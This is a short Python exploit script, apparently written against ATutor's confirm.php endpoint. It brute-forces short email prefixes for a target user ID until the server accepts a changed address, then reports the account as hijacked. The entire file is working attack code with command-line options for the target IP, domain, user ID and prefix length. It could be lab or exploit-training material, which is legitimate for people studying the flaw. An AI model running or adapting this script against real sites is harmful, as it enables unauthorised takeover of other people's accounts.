import hashlib, string, itertools, re, sys, requests, argparse

def mailUpdate(ip, domain, id, prefixLen):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(prefixLen))):
        email = "%s@%s" % (word, domain)
        url = "http://%s/confirm.php?e=%s&m=0&id=%s" % (ip, email, id)
        print("[+] Attempting to update e-mail address with: %s" % email, end="\r", flush=True)
        r = requests.get(url, allow_redirects=False)
        if(r.status_code == 302):
            return (True, email, count)
        else:
            count += 1
    return (False, '', count)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', help='Target IP address', required=True)
    parser.add_argument('--domain', help='Target domain', required=True)
    parser.add_argument('--id', help='User ID', required=True)
    parser.add_argument('--len', help='Prefix length', required=True)
    if len(sys.argv)<=1:
        print("[!] Usage: python3 %s --ip 192.168.0.5:80/ATutor --domain atutor.local --id 1 --len 3 " % sys.argv[0])
        parser.print_help()
        sys.exit(-1)
    args = parser.parse_args()
    ip = args.ip
    domain = args.domain
    id = args.id
    prefixLen = args.len

    result, email, counted = mailUpdate(ip, domain, id, prefixLen)
    if(result):
        print("\n[+] Account successfully hijacked!")
        print("\n[+] E-mail %s replaced with %d requests." % (email, counted))
    else:
        print("\n[!] Account hijacking failed.")

if __name__ == "__main__":
    main()
